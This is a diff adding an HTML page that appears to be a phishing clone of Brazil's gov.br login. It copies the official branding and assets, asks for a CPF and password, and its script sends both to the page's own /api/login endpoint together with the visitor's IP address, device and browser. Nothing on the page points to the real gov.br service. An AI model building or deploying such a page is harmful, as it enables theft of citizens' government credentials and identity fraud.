@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gov.br - Acesse sua conta</title>
+    <link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/fontawesome/css/all.min.css">
+    <link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/fonts/rawline/rawline.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Rawline', 'Segoe UI', sans-serif;
+            background: #F5F5F5;
+            min-height: 100vh;
+        }
+        header {
+            background: #FFFFFF;
+            border-bottom: 1px solid #D4D4D4;
+            padding: 16px 32px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        header img { height: 45px; }
+        #acessibilidade { display: flex; gap: 20px; }
+        #acessibilidade a { color: #1351B4; text-decoration: none; font-size: 14px; }
+        .container {
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0 20px;
+            display: flex;
+            gap: 40px;
+            flex-wrap: wrap;
+        }
+        #aside-signin { flex: 1; min-width: 250px; }
+        #identidade-govbr { width: 100%; max-width: 400px; border-radius: 10px; }
+        #main-signin { flex: 2; min-width: 300px; }
+        .card {
+            background: white;
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+        }
+        .card h3 { color: #1E1E1E; margin-bottom: 24px; font-size: 20px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; color: #333; }
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #CCC;
+            border-radius: 8px;
+            font-size: 16px;
+            font-family: inherit;
+        }
+        .form-group input:focus { outline: none; border-color: #1351B4; box-shadow: 0 0 0 2px rgba(19,81,180,0.1); }
+        .btn-login {
+            width: 100%;
+            background: #1351B4;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn-login:hover { background: #0E3D8A; }
+        .btn-login:disabled { opacity: 0.6; cursor: not-allowed; }
+        .links { text-align: center; margin-top: 20px; }
+        .links a { color: #1351B4; text-decoration: none; font-size: 13px; margin: 0 10px; }
+        .message {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            display: none;
+        }
+        .message.error { background: #FEE; color: #C33; border: 1px solid #FCC; display: block; }
+        .message.success { background: #E5F5E5; color: #2E7D32; border: 1px solid #C8E6C9; display: block; }
+        .loading {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #999;
+            font-size: 12px;
+        }
+        .separator::before, .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #ddd;
+        }
+        .separator::before { margin-right: 10px; }
+        .separator::after { margin-left: 10px; }
+        .social-login { display: flex; gap: 15px; justify-content: center; }
+        .social-btn {
+            flex: 1;
+            padding: 10px;
+            background: #F5F5F5;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            text-align: center;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        .footer-links { margin-top: 24px; padding-top: 20px; border-top: 1px solid #E0E0E0; }
+        .footer-links a { display: block; color: #1351B4; text-decoration: none; margin-bottom: 10px; font-size: 13px; }
+        @media (max-width: 768px) { .container { flex-direction: column; } header { flex-direction: column; text-align: center; } }
+    </style>
+</head>
+<body>
+    <header>
+        <a href="#"><img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Logomarca GovBR"></a>
+        <div id="acessibilidade">
+            <span><a href="#"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a></span>
+            <span><a href="#"><i class="fas fa-deaf"></i><span>VLibras</span></a></span>
+        </div>
+    </header>
+
+    <div class="container">
+        <aside id="aside-signin">
+            <img id="identidade-govbr" src="https://sso.acesso.gov.br/assets/govbr/img/conta_govbr_v2.jpg" alt="Logomarca GovBR">
+        </aside>
+        <main id="main-signin">
+            <div class="card">
+                <h3>Identifique-se no gov.br</h3>
+                
+                <div class="form-group">
+                    <label>CPF</label>
+                    <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
+                </div>
+                
+                <div class="form-group">
+                    <label>Senha</label>
+                    <input type="password" id="password" placeholder="Digite sua senha">
+                </div>
+                
+                <button class="btn-login" id="loginBtn">Entrar</button>
+                
+                <div class="links">
+                    <a href="#">Esqueci minha senha</a>
+                    <a href="#">Criar nova conta</a>
+                </div>
+                
+                <div class="separator">ou</div>
+                
+                <div class="social-login">
+                    <div class="social-btn">🏦 Bancos</div>
+                    <div class="social-btn">📱 QR Code</div>
+                    <div class="social-btn">🔐 Certificado</div>
+                </div>
+                
+                <div class="footer-links">
+                    <a href="#">Está com dúvidas e precisa de ajuda?</a>
+                    <a href="#">Termo de Uso e Aviso de Privacidade</a>
+                </div>
+                
+                <div id="message" class="message"></div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        function formatCPF(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+            if (value.length >= 4) value = value.replace(/(\d{3})(\d)/, '$1.$2');
+            if (value.length >= 8) value = value.replace(/(\d{3})(\d)/, '$1.$2');
+            if (value.length >= 11) value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            input.value = value;
+        }
+        
+        function showMessage(msg, type) {
+            const msgDiv = document.getElementById('message');
+            msgDiv.textContent = msg;
+            msgDiv.className = `message ${type}`;
+            setTimeout(() => msgDiv.style.display = 'none', 4000);
+        }
+        
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) { return 'Não coletado'; }
+        }
+        
+        async function fazerLogin() {
+            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('loginBtn');
+            
+            if (!cpf || cpf.length !== 11) {
+                showMessage('Digite um CPF válido (11 dígitos)', 'error');
+                return;
+            }
+            if (!password) {
+                showMessage('Digite sua senha', 'error');
+                return;
+            }
+            
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span> Entrando...';
+            
+            const ip = await getIP();
+            const userAgent = navigator.userAgent;
+            const dispositivo = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent) ? 'Mobile' : 'Desktop';
+            const navegador = userAgent.includes('Chrome') ? 'Chrome' : (userAgent.includes('Firefox') ? 'Firefox' : (userAgent.includes('Safari') ? 'Safari' : 'Outro'));
+            
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cpf, password, ip, dispositivo, navegador })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showMessage('Login realizado! Redirecionando...', 'success');
+                    localStorage.setItem('token', data.token);
+                    localStorage.setItem('user', JSON.stringify(data.user));
+                    
+                    setTimeout(() => {
+                        if (data.user.role === 'admin') {
+                            window.location.href = '/admin.html';
+                        } else {
+                            window.location.href = '/dashboard.html';
+                        }
+                    }, 1500);
+                } else {
+                    showMessage(data.error || 'CPF ou senha inválidos', 'error');
+                    btn.disabled = false;
+                    btn.innerHTML = 'Entrar';
+                }
+            } catch(error) {
+                showMessage('Erro ao conectar com o servidor', 'error');
+                btn.disabled = false;
+                btn.innerHTML = 'Entrar';
+            }
+        }
+        
+        document.getElementById('cpf').addEventListener('input', function() { formatCPF(this); });
+        document.getElementById('password').addEventListener('keypress', function(e) { if (e.key === 'Enter') fazerLogin(); });
+        document.getElementById('loginBtn').addEventListener('click', fazerLogin);
+    </script>
+</body>
+</html>
